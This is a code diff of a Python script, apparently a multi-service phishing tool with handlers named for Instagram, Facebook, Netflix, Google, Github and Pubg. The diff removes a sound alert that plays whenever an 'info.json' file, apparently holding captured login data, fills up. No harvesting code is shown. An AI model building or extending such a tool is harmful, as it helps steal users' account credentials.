@@ -4,11 +4,9 @@ import sys
 import os
 import linecache
 import random
-import threading
 from time import sleep
 try:
     from colorama import Fore , init; init()
-    from playsound import playsound
     import win32gui, win32con
     import pandas as pd
     import keyboard
@@ -152,15 +150,6 @@ def instagram():
         while True:
             size = os.stat("info.json")
             if size.st_size != 0:
-                
-                #play sound
-                os.chdir(r"../Voice")
-                sound = playsound("T_connected.mp3")
-                t = threading.Thread(target=sound)
-                t.start()
-                sleep(0.5)
-                os.chdir(fr"{path}/instagram")
-                sleep(0.5)
 
                 
                 with open("info.json", "r") as read_file:
@@ -267,15 +256,6 @@ def facebook():
             size = os.stat("info.json")
             if size.st_size != 0:
 
-                #play sound
-                os.chdir(r"../Voice")
-                sound = playsound("T_connected.mp3")
-                t = threading.Thread(target=sound)
-                t.start()
-                sleep(0.5)
-                os.chdir(fr"{path}/facebook")
-                sleep(0.5)
-
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -381,15 +361,6 @@ def netflix():
             size = os.stat("info.json")
             if size.st_size != 0:
 
-                #play sound
-                os.chdir(r"../Voice")
-                sound = playsound("T_connected.mp3")
-                t = threading.Thread(target=sound)
-                t.start()
-                sleep(0.5)
-                os.chdir(fr"{path}/Netflix")
-                sleep(0.5)
-
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -494,15 +465,6 @@ def Google():
         while True:
             size = os.stat("info.json")
             if size.st_size != 0:
-
-                #play sound
-                os.chdir(r"../Voice")
-                sound = playsound("T_connected.mp3")
-                t = threading.Thread(target=sound)
-                t.start()
-                sleep(0.5)
-                os.chdir(fr"{path}/Google")
-                sleep(0.5)
 
 
                 with open("info.json", "r") as read_file:
@@ -611,15 +573,6 @@ def Github():
             size = os.stat("info.json")
             if size.st_size != 0:
 
-                #play sound
-                os.chdir(r"../Voice")
-                sound = playsound("T_connected.mp3")
-                t = threading.Thread(target=sound)
-                t.start()
-                sleep(0.5)
-                os.chdir(fr"{path}/Github")
-                sleep(0.5)
-
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -725,15 +678,6 @@ def Pubg():
         while True:
             size = os.stat("info.json")
             if size.st_size != 0:
-
-                #play sound
-                os.chdir(r"../Voice")
-                sound = playsound("T_connected.mp3")
-                t = threading.Thread(target=sound)
-                t.start()
-                sleep(0.5)
-                os.chdir(fr"{path}/Pubg")
-                sleep(0.5)
 
 
                 with open("info.json", "r") as read_file:
